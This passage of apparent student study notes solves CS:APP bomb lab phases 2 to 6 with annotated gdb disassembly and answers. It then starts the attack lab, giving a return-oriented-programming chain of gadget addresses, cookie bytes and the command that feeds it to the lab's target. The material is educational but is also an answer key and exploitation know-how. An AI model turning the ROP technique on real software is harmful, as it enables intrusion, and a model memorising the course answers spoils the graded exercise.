0x400f25 &lt;phase_2+41&gt;\n   0x0000000000400f20 &lt;+36&gt;:    callq  0x40143a &lt;explode_bomb&gt;\n   0x0000000000400f25 &lt;+41&gt;:    add    $0x4,%rbx\n   //\n   0x0000000000400f29 &lt;+45&gt;:    cmp    %rbp,%rbx\n   // stop when the rbp is at 0x18 = 24bytes\n   0x0000000000400f2c &lt;+48&gt;:    jne    0x400f17 &lt;phase_2+27&gt;\n   0x0000000000400f2e &lt;+50&gt;:    jmp    0x400f3c &lt;phase_2+64&gt;\n   0x0000000000400f30 &lt;+52&gt;:    lea    0x4(%rsp),%rbx\n   0x0000000000400f35 &lt;+57&gt;:    lea    0x18(%rsp),%rbp\n   //0x18 = 24, last digit in rbp\n   0x0000000000400f3a &lt;+62&gt;:    jmp    0x400f17 &lt;phase_2+27&gt;\n   0x0000000000400f3c &lt;+64&gt;:    add    $0x28,%rsp\n   0x0000000000400f40 &lt;+68&gt;:    pop    %rbx\n   0x0000000000400f41 &lt;+69&gt;:    pop    %rbp\n   0x0000000000400f42 &lt;+70&gt;:    retq   \n</code></pre> <p><code>rdi is the input</code></p> <pre><code>Dump of assembler code for function read_six_numbers:\n   0x000000000040145c &lt;+0&gt;:     sub    $0x18,%rsp\n   // assign 24 bytes to the rsp\n   0x0000000000401460 &lt;+4&gt;:     mov    %rsi,%rdx\n   0x0000000000401463 &lt;+7&gt;:     lea    0x4(%rsi),%rcx\n   0x0000000000401467 &lt;+11&gt;:    lea    0x14(%rsi),%rax\n   0x000000000040146b &lt;+15&gt;:    mov    %rax,0x8(%rsp)\n   0x0000000000401470 &lt;+20&gt;:    lea    0x10(%rsi),%rax\n   0x0000000000401474 &lt;+24&gt;:    mov    %rax,(%rsp)\n   0x0000000000401478 &lt;+28&gt;:    lea    0xc(%rsi),%r9\n   0x000000000040147c &lt;+32&gt;:    lea    0x8(%rsi),%r8\n   0x0000000000401480 &lt;+36&gt;:    mov    $0x4025c3,%esi\n   0x0000000000401485 &lt;+41&gt;:    mov    $0x0,%eax\n   0x000000000040148a &lt;+46&gt;:    callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;\n   0x000000000040148f &lt;+51&gt;:    cmp    $0x5,%eax\n   0x0000000000401492 &lt;+54&gt;:    jg     0x401499 &lt;read_six_numbers+61&gt;\n   0x0000000000401494 &lt;+56&gt;:    callq  0x40143a &lt;explode_bomb&gt;\n   0x0000000000401499 &lt;+61&gt;:    add    $0x18,%rsp\n   0x000000000040149d &lt;+65&gt;:    retq   \nEnd of assembler dump.\n</code></pre> <p>What this function does is to just read six numbers, and store them into each register </p> <p></p>"},{"location":"Systems/CSAPP/#ans_1","title":"Ans:","text":"<p>1 2 4 8 16 32</p>"},{"location":"Systems/CSAPP/#phase_3","title":"Phase_3","text":"<pre><code>Dump of assembler code for function phase_3:\n   0x0000000000400f43 &lt;+0&gt;:     sub    $0x18,%rsp\n   0x0000000000400f47 &lt;+4&gt;:     lea    0xc(%rsp),%rcx\n   0x0000000000400f4c &lt;+9&gt;:     lea    0x8(%rsp),%rdx\n   0x0000000000400f51 &lt;+14&gt;:    mov    $0x4025cf,%esi\n   0x0000000000400f56 &lt;+19&gt;:    mov    $0x0,%eax\n   0x0000000000400f5b &lt;+24&gt;:    callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;\n   0x0000000000400f60 &lt;+29&gt;:    cmp    $0x1,%eax\n   0x0000000000400f63 &lt;+32&gt;:    jg     0x400f6a &lt;phase_3+39&gt;\n   0x0000000000400f65 &lt;+34&gt;:    callq  0x40143a &lt;explode_bomb&gt;\n   0x0000000000400f6a &lt;+39&gt;:    cmpl   $0x7,0x8(%rsp)\n   0x0000000000400f6f &lt;+44&gt;:    ja     0x400fad &lt;phase_3+106&gt;\n   //compare the rsp with 0x7, if above will just explode the bomb\n   0x0000000000400f71 &lt;+46&gt;:    mov    0x8(%rsp),%eax\n   0x0000000000400f75 &lt;+50&gt;:    jmpq   *0x402470(,%rax,8)\n\n   // jump table\n   (gdb) x/8gx 0x402470\n0x402470:       0x0000000000400f7c      0x0000000000400fb9\n0x402480:       0x0000000000400f83      0x0000000000400f8a\n0x402490:       0x0000000000400f91      0x0000000000400f98\n0x4024a0:       0x0000000000400f9f      0x0000000000400fa6\n, so if the first int is 0, jump to 0x0000000000400f7c, store 0xcf and compare with 2nd int. 0xcf = (CF)\u2081\u2086 = (12 \u00d7 16\u00b9) + (15 \u00d7 16\u2070) = 207\n   0x0000000000400f7c &lt;+57&gt;:    mov    $0xcf,%eax\n   0x0000000000400f81 &lt;+62&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;\n   0x0000000000400f83 &lt;+64&gt;:    mov    $0x2c3,%eax\n   0x0000000000400f88 &lt;+69&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;\n   0x0000000000400f8a &lt;+71&gt;:    mov    $0x100,%eax\n   0x0000000000400f8f &lt;+76&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;\n   0x0000000000400f91 &lt;+78&gt;:    mov    $0x185,%eax\n   0x0000000000400f96 &lt;+83&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;\n   0x0000000000400f98 &lt;+85&gt;:    mov    $0xce,%eax\n   0x0000000000400f9d &lt;+90&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;\n   0x0000000000400f9f &lt;+92&gt;:    mov    $0x2aa,%eax\n   0x0000000000400fa4 &lt;+97&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;\n   0x0000000000400fa6 &lt;+99&gt;:    mov    $0x147,%eax\n   0x0000000000400fab &lt;+104&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;\n   0x0000000000400fad &lt;+106&gt;:   callq  0x40143a &lt;explode_bomb&gt;\n   0x0000000000400fb2 &lt;+111&gt;:   mov    $0x0,%eax\n   0x0000000000400fb7 &lt;+116&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;\n   0x0000000000400fb9 &lt;+118&gt;:   mov    $0x137,%eax\n   0x0000000000400fbe &lt;+123&gt;:   cmp    0xc(%rsp),%eax\n   0x0000000000400fc2 &lt;+127&gt;:   je     0x400fc9 &lt;phase_3+134&gt;\n   0x0000000000400fc4 &lt;+129&gt;:   callq  0x40143a &lt;explode_bomb&gt;\n   0x0000000000400fc9 &lt;+134&gt;:   add    $0x18,%rsp\n   0x0000000000400fcd &lt;+138&gt;:   retq   \nEnd of assembler dump.\n</code></pre>"},{"location":"Systems/CSAPP/#jump-table","title":"Jump Table","text":""},{"location":"Systems/CSAPP/#ans_2","title":"Ans:","text":"<p>0 207</p>"},{"location":"Systems/CSAPP/#phase_4","title":"Phase_4","text":"<pre><code>Dump of assembler code for function phase_4:\n   0x000000000040100c &lt;+0&gt;:     sub    $0x18,%rsp\n   0x0000000000401010 &lt;+4&gt;:     lea    0xc(%rsp),%rcx   ;2nd = 0xc(%rsp)\n   0x0000000000401015 &lt;+9&gt;:     lea    0x8(%rsp),%rdx   ;1st= 0x8(%rsp)\n   0x000000000040101a &lt;+14&gt;:    mov    $0x4025cf,%esi   ;0x4025cf:       \"%d %d\"\n   0x000000000040101f &lt;+19&gt;:    mov    $0x0,%eax        \n   0x0000000000401024 &lt;+24&gt;:    callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;\n   0x0000000000401029 &lt;+29&gt;:    cmp    $0x2,%eax    expect 2ints\n   0x000000000040102c &lt;+32&gt;:    jne    0x401035 &lt;phase_4+41&gt;\n   0x000000000040102e &lt;+34&gt;:    cmpl   $0xe,0x8(%rsp)       ;0x8(%rsp)= 1st &lt;= 14\n   0x0000000000401033 &lt;+39&gt;:    jbe    0x40103a &lt;phase_4+46&gt;    ;jump if below \n   0x0000000000401035 &lt;+41&gt;:    callq  0x40143a &lt;explode_bomb&gt;\n   0x000000000040103a &lt;+46&gt;:    mov    $0xe,%edx        ;edx = 14\n   0x000000000040103f &lt;+51&gt;:    mov    $0x0,%esi        ;esi = 0\n   0x0000000000401044 &lt;+56&gt;:    mov    0x8(%rsp),%edi   ;edi = 1st &lt;= 14\n   0x0000000000401048 &lt;+60&gt;:    callq  0x400fce &lt;func4&gt; \n   0x000000000040104d &lt;+65&gt;:    test   %eax,%eax        ; expeact eax to be 0, one case if edi =6\n   0x000000000040104f &lt;+67&gt;:    jne    0x401058 &lt;phase_4+76&gt;    //jump not !eq/!zero\n   0x0000000000401051 &lt;+69&gt;:    cmpl   $0x0,0xc(%rsp)       ; cmp 0 2nd\n   0x0000000000401056 &lt;+74&gt;:    je     0x40105d &lt;phase_4+81&gt;    ;solve if euqal, so 2nd =0\n   0x0000000000401058 &lt;+76&gt;:    callq  0x40143a &lt;explode_bomb&gt;\n   0x000000000040105d &lt;+81&gt;:    add    $0x18,%rsp\n   0x0000000000401061 &lt;+85&gt;:    retq   \nEnd of assembler dump.\n\nDump of assembler code for function func4: (edi = x, esi =0, edx = 14)\n   0x0000000000400fce &lt;+0&gt;:     sub    $0x8,%rsp\n   0x0000000000400fd2 &lt;+4&gt;:     mov    %edx,%eax ;eax = 14\n   0x0000000000400fd4 &lt;+6&gt;:     sub    %esi,%eax ;eax = 14 - 0\n   0x0000000000400fd6 &lt;+8&gt;:     mov    %eax,%ecx ;ecx = 14\n   0x0000000000400fd8 &lt;+10&gt;:    shr    $0x1f,%ecx ; ecx = 0\n   //shr -&gt; logical shift by index ecx\n\n   0x0000000000400fdb &lt;+13&gt;:    add    %ecx,%eax  ;eax = 0 + 14\n   0x0000000000400fdd &lt;+15&gt;:    sar    %eax ; eax = 1110 &gt;&gt; 1 = 111 = 7\n   //sar Shift Arithmetic Right. \n   // arithmetic shift will maintain the sign bit \n   0x0000000000400fdf &lt;+17&gt;:    lea    (%rax,%rsi,1),%ecx   ecx = 6\n   // addressing mode. ecx = rax + rsi * 1 = 6 +0 * 1= 6\n   0x0000000000400fe2 &lt;+20&gt;:    cmp    %edi,%ecx    cmp x, 6\n   0x0000000000400fe4 &lt;+22&gt;:    jle    0x400ff2 &lt;func4+36&gt;  ;jump if less or equal\n   0x0000000000400fe6 &lt;+24&gt;:    lea    -0x1(%rcx),%edx\n   0x0000000000400fe9 &lt;+27&gt;:    callq  0x400fce &lt;func4&gt;\n   0x0000000000400fee &lt;+32&gt;:    add    %eax,%eax\n   0x0000000000400ff0 &lt;+34&gt;:    jmp    0x401007 &lt;func4+57&gt;\n   0x0000000000400ff2 &lt;+36&gt;:    mov    $0x0,%eax    ;eax =0\n   0x0000000000400ff7 &lt;+41&gt;:    cmp    %edi,%ecx    ;cmp x, 7    first do lower than greater compare\n   0x0000000000400ff9 &lt;+43&gt;:    jge    0x401007 &lt;func4+57&gt;  // jump if greater or equal ; 6 in this case could pass, edi =6\n   0x0000000000400ffb &lt;+45&gt;:    lea    0x1(%rcx),%esi\n   0x0000000000400ffe &lt;+48&gt;:    callq  0x400fce &lt;func4&gt;\n   0x0000000000401003 &lt;+53&gt;:    lea    0x1(%rax,%rax,1),%eax\n   0x0000000000401007 &lt;+57&gt;:    add    $0x8,%rsp\n   0x000000000040100b &lt;+61&gt;:    retq   \nEnd of assembler dump.\n</code></pre>"},{"location":"Systems/CSAPP/#ans_3","title":"Ans:","text":"<p>7 0</p>"},{"location":"Systems/CSAPP/#phase_5","title":"Phase_5","text":"<pre><code>(gdb) disas phase_5\nDump of assembler code for function phase_5: (rdi is the input string)\n   0x0000000000401062 &lt;+0&gt;:     push   %rbx     ;save rbx reg   \n   0x0000000000401063 &lt;+1&gt;:     sub    $0x20,%rsp   ;allocate 32\n   0x0000000000401067 &lt;+5&gt;:     mov    %rdi,%rbx    ;rbx = rdi (input)\n   0x000000000040106a &lt;+8&gt;:     mov    %fs:0x28,%rax    ;canary setup, \n   0x0000000000401073 &lt;+17&gt;:    mov    %rax,0x18(%rsp)  ;24 rsp = rax\n   0x0000000000401078 &lt;+22&gt;:    xor    %eax,%eax    ;erase canary\n   0x000000000040107a &lt;+24&gt;:    callq  0x40131b &lt;string_length&gt; ;from phase_1, calcualte string length\n   0x000000000040107f &lt;+29&gt;:    cmp    $0x6,%eax    ;expect 6 strings separate with space\n   0x0000000000401082 &lt;+32&gt;:    je     0x4010d2 &lt;phase_5+112&gt;   ;go to 112\n   0x0000000000401084 &lt;+34&gt;:    callq  0x40143a &lt;explode_bomb&gt;\n   0x0000000000401089 &lt;+39&gt;:    jmp    0x4010d2 &lt;phase_5+112&gt;\n   ; loop from the +74, rbx is the input, for(rax=0; rax&lt;=6;rax++)\n   0x000000000040108b &lt;+41&gt;:    movzbl (%rbx,%rax,1),%ecx   ;ecx = rbx + rax * 1 = rbx = input, rbx is the index of the 6 chars, so each time the rax will increase by 1, and rbx pointer will increment by 1\n   0x000000000040108f &lt;+45&gt;:    mov    %cl,(%rsp)           ;rsp = 8bit rcx, first char of input into rsp\n   0x0000000000401092 &lt;+48&gt;:    mov    (%rsp),%rdx          ;rdx = rsp = first char\n   0x0000000000401096 &lt;+52&gt;:    and    $0xf,%edx            ;edx = 0xf = 0b1111 &amp; first char, expect first to be 9, first can be i or y, second can be o or O\n;http://sticksandstones.kstrom.com/appen.html, use this link to find docs\n    ;3rd -&gt; n,N\n   ;4rd -&gt; e, E, u, U\n   ;5th -&gt; v,F,V\n   ;6th -&gt; g,G,w,W\n   0x0000000000401099 &lt;+55&gt;:    movzbl 0x4024b0(%rdx),%edx  ;edx = 0x4024b0 + (rdx)\n;   (gdb) x/s 0x4024b0\n;0x4024b0 &lt;array.3449&gt;:  \"maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?\"\n; based on the index of bl, move the first char into edx, use this string to decrept the msg\n;rdx = 9. edx = f\n;rdx = 15. edx = l\n;rdx = 14. edx = y\n;rdx = 5, edx = e\n;rdx = 6, edx = r\n;rdx = 7. edx = s\n   0x00000000004010a0 &lt;+62&gt;:    mov    %dl,0x10(%rsp,%rax,1)    ;rdx(8bit), 0x10 + rsp + rax*1 = 0x10 + rsp\n   0x00000000004010a4 &lt;+66&gt;:    add    $0x1,%rax    ;rax = 1\n   0x00000000004010a8 &lt;+70&gt;:    cmp    $0x6,%rax    ;cmp rax,6\n   0x00000000004010ac &lt;+74&gt;:    jne    0x40108b &lt;phase_5+41&gt;    ;recursion until it reaches the end\n   0x00000000004010ae &lt;+76&gt;:    movb   $0x0,0x16(%rsp)      ; 24rsp = 0\n   0x00000000004010b3 &lt;+81&gt;:    mov    $0x40245e,%esi       ;(gdb) x/s 0x40245e 0x40245e:       \"flyers\"\n   0x00000000004010b8 &lt;+86&gt;:    lea    0x10(%rsp),%rdi      ; rdi = 16rsp\n   0x00000000004010bd &lt;+91&gt;:    callq  0x401338 &lt;strings_not_equal&gt; ;compare the rsi and rdi\n   0x00000000004010c2 &lt;+96&gt;:    test   %eax,%eax\n   0x00000000004010c4 &lt;+98&gt;:    je     0x4010d9 &lt;phase_5+119&gt;\n   0x00000000004010c6 &lt;+100&gt;:   callq  0x40143a &lt;explode_bomb&gt;\n   0x00000000004010cb &lt;+105&gt;:   nopl   0x0(%rax,%rax,1)\n   0x00000000004010d0 &lt;+110&gt;:   jmp    0x4010d9 &lt;phase_5+119&gt;\n   0x00000000004010d2 &lt;+112&gt;:   mov    $0x0,%eax    ;eax = 0\n   0x00000000004010d7 &lt;+117&gt;:   jmp    0x40108b &lt;phase_5+41&gt;    ;jmp to phase_5 + 41\n   0x00000000004010d9 &lt;+119&gt;:   mov    0x18(%rsp),%rax\n   0x00000000004010de &lt;+124&gt;:   xor    %fs:0x28,%rax\n   0x00000000004010e7 &lt;+133&gt;:   je     0x4010ee &lt;phase_5+140&gt;\n   0x00000000004010e9 &lt;+135&gt;:   callq  0x400b30 &lt;__stack_chk_fail@plt&gt;\n   0x00000000004010ee &lt;+140&gt;:   add    $0x20,%rsp\n   0x00000000004010f2 &lt;+144&gt;:   pop    %rbx\n   0x00000000004010f3 &lt;+145&gt;:   retq   \nEnd of assembler dump.\n</code></pre> <p>Crazy question :&lt;&gt;&lt;&gt;</p>"},{"location":"Systems/CSAPP/#ans_4","title":"Ans:","text":"<p>ionevg</p>"},{"location":"Systems/CSAPP/#phase_6","title":"Phase_6","text":"<pre><code>s(gdb) disas phase_6\nDump of assembler code for function phase_6:\n   0x00000000004010f4 &lt;+0&gt;:     push   %r14\n   0x00000000004010f6 &lt;+2&gt;:     push   %r13\n   0x00000000004010f8 &lt;+4&gt;:     push   %r12\n   0x00000000004010fa &lt;+6&gt;:     push   %rbp\n   0x00000000004010fb &lt;+7&gt;:     push   %rbx\n   0x00000000004010fc &lt;+8&gt;:     sub    $0x50,%rsp   \n   0x0000000000401100 &lt;+12&gt;:    mov    %rsp,%r13    ;r13 = rsp      ;r13 and rsi can both represent input\n   0x0000000000401103 &lt;+15&gt;:    mov    %rsp,%rsi    ;rsi = rsp\n   0x0000000000401106 &lt;+18&gt;:    callq  0x40145c &lt;read_six_numbers&gt;  ;load six inputs from rdi to rsp, see notes from phase_2, index by 4 each           ;rsp = six numbers\n   0x000000000040110b &lt;+23&gt;:    mov    %rsp,%r14    ;r14 = rsp\n   0x000000000040110e &lt;+26&gt;:    mov    $0x0,%r12d   ;r12d = 0\n\n   0x0000000000401114 &lt;+32&gt;:    mov    %r13,%rbp    ;rbp = r13, rbp=r13 = 2nd int\n   0x0000000000401117 &lt;+35&gt;:    mov    0x0(%r13),%eax       ;eax = r13 + 0, first number\n   0x000000000040111b &lt;+39&gt;:    sub    $0x1,%eax    ;eax = eax - 1\n   0x000000000040111e &lt;+42&gt;:    cmp    $0x5,%eax    ;cmp eax,5      eax &lt;= 5, from previouse, eax &lt;= 6 \n   0x0000000000401121 &lt;+45&gt;:    jbe    0x401128 &lt;phase_6+52&gt;    ;jmp if eax is below or equal to 5, has to\n   0x0000000000401123 &lt;+47&gt;:    callq  0x40143a &lt;explode_bomb&gt;  \n   0x0000000000401128 &lt;+52&gt;:    add    $0x1,%r12d   ;r12d = r12d + 1 = 0 + 1\n   0x000000000040112c &lt;+56&gt;:    cmp    $0x6,%r12d   ;cmp 6, r12d(1)\n   0x0000000000401130 &lt;+60&gt;:    je     0x401153 &lt;phase_6+95&gt;    ;jump if equal, not equal for the first\n   0x0000000000401132 &lt;+62&gt;:    mov    %r12d,%ebx   ;ebx = r12d = 1\n\n   ;another loop to verify no repeated ints\n   0x0000000000401135 &lt;+65&gt;:    movslq %ebx,%rax    ;rax = ebx = 1, rax=ebx=2\n   ;movslq, movsbl src, dst byte to int, sign-extend, if the ebx -&gt; convert to single byte is 1, extend the sign bit\n   0x0000000000401138 &lt;+68&gt;:    mov    (%rsp,%rax,4),%eax   ;eax = rsp + rax*4 = rsp + 1*4, move the input string right by 1, index will increase again now\n   0x000000000040113b &lt;+71&gt;:    cmp    %eax,0x0(%rbp)   ;\n   0x000000000040113e &lt;+74&gt;:    jne    0x401145 &lt;phase_6+81&gt;    ;can not be equal, 1st and 2nd\n   0x0000000000401140 &lt;+76&gt;:    callq  0x40143a &lt;explode_bomb&gt;\n   0x0000000000401145 &lt;+81&gt;:    add    $0x1,%ebx    ;ebx = ebx + 1\n   0x0000000000401148 &lt;+84&gt;:    cmp    $0x5,%ebx    ;cmp 5,ebx + 1\n   0x000000000040114b &lt;+87&gt;:    jle    0x401135 &lt;phase_6+65&gt;    ;jmp if ebx &lt;= 5\n   0x000000000040114d &lt;+89&gt;:    add    $0x4,%r13    ;r13 +4, move to 2nd int\n   0x0000000000401151 &lt;+93&gt;:    jmp    0x401114 &lt;phase_6+32&gt; ;\n\n   ;32 - 93: go from each input, compare with make sure not higher than 6, and each int it will compare if it is the same as the rest of the ints. Make sure no repeated value appear, then in this case. the input 0,1,2,3,4,5,6\n\n   0x0000000000401153 &lt;+95&gt;:    lea    0x18(%rsp),%rsi  ;load last int to rsi\n   0x0000000000401158 &lt;+100&gt;:   mov    %r14,%rax    ;rax = r14 = first int index\n   0x000000000040115b &lt;+103&gt;:   mov    $0x7,%ecx    ;ecx = 0x7\n\n   0x0000000000401160 &lt;+108&gt;:   mov    %ecx,%edx    ;edx = ecx = 0x7\n   0x0000000000401162 &lt;+110&gt;:   sub    (%rax),%edx  ; edx = edx - rax = 7 - 1st int\n   0x0000000000401164 &lt;+112&gt;:   mov    %edx,(%rax)  ; (rax) = edx\n   0x0000000000401166 &lt;+114&gt;:   add    $0x4,%rax    ; (rax) = rax + 0x4\n   0x000000000040116a &lt;+118&gt;:   cmp    %rsi,%rax    ; cmp last_int, rax= (7-1st int) + 0x4 = 11 - 1st int, compare the last int with the \n   0x000000000040116d &lt;+121&gt;:   jne    0x401160 &lt;phase_6+108&gt;   ;\n\n   ;95 - 121: loop six values, use 7 to subtrace each int\n\n   0x000000000040116f &lt;+123&gt;:   mov    $0x0,%esi    ;esi = 0\n   0x0000000000401174 &lt;+128&gt;:   jmp    0x401197 &lt;phase_6+163&gt;\n\n   0x0000000000401176 &lt;+130&gt;:   mov    0x8(%rdx),%rdx; rdx = rdx +8 = -32\n   ;0x6032d8 &lt;node1+8&gt;:     \"\\340\\062`\" , this is octal format, convert it to decimal = 224, 50,\n   0x000000000040117a &lt;+134&gt;:   add    $0x1,%eax ;eax = 2\n   0x000000000040117d &lt;+137&gt;:   cmp    %ecx,%eax    ;cmp 2nd int with 2, if not equal, keep adding 1 until it equals the 2nd int. \n   0x000000000040117f &lt;+139&gt;:   jne    0x401176 &lt;phase_6+130&gt;\n   0x0000000000401181 &lt;+141&gt;:   jmp    0x401188 &lt;phase_6+148&gt;   ;if equal, eax = ecx = 2nd int\n   ;from 169\n   0x0000000000401183 &lt;+143&gt;:   mov    $0x6032d0,%edx   ;if the value is 6 , edx = 76\n   0x0000000000401188 &lt;+148&gt;:   mov    %rdx,0x20(%rsp,%rsi,2)   ;rsp + 2*rsi + 20 = 1st int + 20 = move 1 to the last int\n   0x000000000040118d &lt;+153&gt;:   add    $0x4,%rsi    ;rsi = 0 +4\n   0x0000000000401191 &lt;+157&gt;:   cmp    $0x18,%rsi   ;cmp if it reaches the end,\n   0x0000000000401195 &lt;+161&gt;:   je     0x4011ab &lt;phase_6+183&gt; ;if not cont,\n\n   0x0000000000401197 &lt;+163&gt;:   mov    (%rsp,%rsi,1),%ecx ;rsp = (1st int + 0 *1) = ecx = 1st int, next loop go to 2nd int\n   0x000000000040119a &lt;+166&gt;:   cmp    $0x1,%ecx    ;cmp 1, ecx, if it is not 6, it should be higher here\n   0x000000000040119d &lt;+169&gt;:   jle    0x401183 &lt;phase_6+143&gt;   ;jmp if ecx &lt; 1, guess only if the input is 6 in this case.\n   0x000000000040119f &lt;+171&gt;:   mov    $0x1,%eax    ;eax = 1\n   0x00000000004011a4 &lt;+176&gt;:   mov    $0x6032d0,%edx   ;edx = 1\n   0x00000000004011a9 &lt;+181&gt;:   jmp    0x401176 &lt;phase_6+130&gt;\n   ;store each int into a node, 1st int -&gt;node1, 2nd int -&gt;node2, the node number corresponds the same value of the converted input\n\n\n   0x00000000004011ab &lt;+183&gt;:   mov    0x20(%rsp),%rbx  ;   rbx = 1st int node number\n   0x00000000004011b0 &lt;+188&gt;:   lea    0x28(%rsp),%rax  ;   rax = 2nd int node number\n   0x00000000004011b5 &lt;+193&gt;:   lea    0x50(%rsp),%rsi  ;end node\n   0x00000000004011ba &lt;+198&gt;:   mov    %rbx,%rcx        ;rcx = rbx = 2nd int node\n\n   0x00000000004011bd &lt;+201&gt;:   mov    (%rax),%rdx      ;rdx = value at node 2nd number 2, to rdx\n   0x00000000004011c0 &lt;+204&gt;:   mov    %rdx,0x8(%rcx)   ;rcx = rbx, load the value of 2\n   0x00000000004011c4 &lt;+208&gt;:   add    $0x8,%rax        ;rax increase by 1 byte\n   0x00000000004011c8 &lt;+212&gt;:   cmp    %rsi,%rax        ;\n   0x00000000004011cb &lt;+215&gt;:   je     0x4011d2 &lt;phase_6+222&gt;\n   0x00000000004011cd &lt;+217&gt;:   mov    %rdx,%rcx        ;\n   0x00000000004011d0 &lt;+220&gt;:   jmp    0x4011bd &lt;phase_6+201&gt;\n ; change the ptr orders based on the storing order.  i think the purpose here is for the below steps, instead of using the rsp + 20/28, it can use pointer arithmatic to plus 8 since we reassign the order of the linked list.\n\n   0x00000000004011d2 &lt;+222&gt;:   movq   $0x0,0x8(%rdx) ;0 to the end?\n   0x00000000004011da &lt;+230&gt;:   mov    $0x5,%ebp      ;rbp =  5\n\n   0x00000000004011df &lt;+235&gt;:   mov    0x8(%rbx),%rax   ;2nd node into rax\n   0x00000000004011e3 &lt;+239&gt;:   mov    (%rax),%eax      ;eax = value\n   0x00000000004011e5 &lt;+241&gt;:   cmp    %eax,(%rbx)      ;rbx is the first node, cmp the node value\n   0x00000000004011e7 &lt;+243&gt;:   jge    0x4011ee &lt;phase_6+250&gt;   ;1st &gt; 2nd, else explode bomb\n   0x00000000004011e9 &lt;+245&gt;:   callq  0x40143a &lt;explode_bomb&gt;\n   0x00000000004011ee &lt;+250&gt;:   mov    0x8(%rbx),%rbx   ;rbx index by 1, now go to 2nd\n   0x00000000004011f2 &lt;+254&gt;:   sub    $0x1,%ebp        ;4\n   0x00000000004011f5 &lt;+257&gt;:   jne    0x4011df &lt;phase_6+235&gt;   ; need zf = 0\n   ;basically compare the value in the node index, increase the node index by 8 every time, make sure the previous one is always greater, sort in descending order\n\n ;(gdb) x/24wx 0x6032d0\n0x6032d0 &lt;node1&gt;:       0x0000014c =  332    0x00000001      0x006032e0      0x00000000\n0x6032e0 &lt;node2&gt;:       0x000000a8  = 168   0x00000002      0x006032f0      0x00000000\n0x6032f0 &lt;node3&gt;:       0x0000039c =924     0x00000003      0x00603300      0x00000000\n0x603300 &lt;node4&gt;:       0x000002b3  = 691   0x00000004      0x00603310      0x00000000\n0x603310 &lt;node5&gt;:       0x000001dd = 477    0x00000005      0x00603320      0x00000000\n0x603320 &lt;node6&gt;:       0x000001bb  = 443    0x00000006      0x00000000      0x00000000\n\n ;descending order. 3-&gt;4-&gt;5-&gt;6-&gt;1-&gt;2, and because we revert it by subtracting from 7, have to revert back\n\n ;4 3 2 1 6 5\n\n   0x00000000004011f7 &lt;+259&gt;:   add    $0x50,%rsp       ;\n   0x00000000004011fb &lt;+263&gt;:   pop    %rbx\n   0x00000000004011fc &lt;+264&gt;:   pop    %rbp\n   0x00000000004011fd &lt;+265&gt;:   pop    %r12\n   0x00000000004011ff &lt;+267&gt;:   pop    %r13\n   0x0000000000401201 &lt;+269&gt;:   pop    %r14\n   0x0000000000401203 &lt;+271&gt;:   retq   \nEnd of assembler dump.\n</code></pre> <p>Notes:</p> <p>In x86-64 assembly, registers like <code>%eax</code> do not have a fixed memory address because they are part of the CPU's internal state. Instead, <code>%eax</code> is a 32-bit register within the CPU that can hold a value. When you perform an operation like <code>mov 0x0(%r13), %eax</code>, you are transferring a value from memory into the <code>%eax</code> register, not an address.</p> <p>Storing Values: <code>RAX</code> can hold any integer value, which can be used for arithmetic operations, comparisons, or as a general-purpose register.</p> <p>Pointer/Address Holder: <code>RAX</code> can store memory addresses, allowing it to be used as a pointer to access or manipulate data in memory.</p>"},{"location":"Systems/CSAPP/#ans_5","title":"Ans:","text":"<p>4 3 2 1 6 5</p> <p> let's goooo</p>"},{"location":"Systems/CSAPP/#lab3-attack-labcode-injection-and-rop-attack","title":"Lab3 - Attack lab(Code Injection and ROP attack)","text":""},{"location":"Systems/CSAPP/#understanding-the-rdi-register-and-parameter-passing","title":"Understanding the <code>rdi</code> Register and Parameter Passing","text":"<ol> <li>Scalar Values (e.g., integers, floats):</li> <li>If the parameter is a scalar value (such as an integer or a float), the actual value is stored directly in the <code>rdi</code> register.</li> <li>For example, if you pass an integer value <code>42</code> to a function, <code>rdi</code> will contain <code>42</code>.</li> <li>Pointers (e.g., strings, arrays, structs):</li> <li>If the parameter is a pointer (such as a string, array, or a struct), the <code>rdi</code> register will contain the address of the memory location where the actual data is stored.</li> <li>For example, if you pass a string <code>\"hello\"</code> to a function, <code>rdi</code> will contain the address of the first character of the string in memory.</li> </ol>"},{"location":"Systems/CSAPP/#phase4","title":"Phase4","text":"<p>ROP attack -&gt; in the code instruction set, each code segment that ends with the return (c3) can be named as gadget.</p> <p>To design, the asm code can be followed from the previous phase2.</p> <p>usual way is we can move the cookie to the stack, and move the stack to the rdi, and push the function address and return. In this case, since we are going to use the code section, we can use rax to pass the cookie.</p> <p>So the ASM will be:</p> <pre><code>pop rax ;58\nret\n//pass the cookie\nmov rax, rdi    ;48 89 c7\nret\n//call the function\n</code></pre> <pre><code>00000000004019a7 &lt;addval_219&gt;:\n  4019a7:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax\n  4019ad:   c3                      retq   \n\n00000000004019a0 &lt;addval_273&gt;:\n  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax\n  4019a6:   c3                      retq   \n\n\n;4019a7 + 4 = 4019ab // ab 19 40\n;pass the cookie as rax // fa 97 b9 59\n;move rax,rdi // 4019a2 // a2 19 40\n;then push the function of touch2 //ec 17 40\n</code></pre> <pre><code>./hex2raw &lt; 4ansmyown.txt | ./rtarget -q\n\ncmd to run\n</code></pre> <p>Summary:</p> <ul> <li>Starting the index at an address means the disassembler will interpret the bytes from that point as a complete instruction.</li> <li>The disassembler decodes each instruction in sequence until it reaches the end of the function or another stopping point.</li> <li>For <code>mov</code> or any other instructions, it decodes the entire instruction set starting from the given address.</li> </ul> <p>Important Points from lab manual:</p> <ul> <li>Your exploit string must not contain byte value 0x0a at any intermediate position, since this is the ASCII code for newline (\u2018\\n\u2019). When Gets encounters this byte, it will assume you intended to terminate the string. </li> <li>HEX2RAW expects two-digit hex values separated by one or more white spaces. So if you want to create a byte with a hex value of 0, you need to write it as 00. To create the word 0xdeadbeef you should pass \u201cef be ad de\u201d to 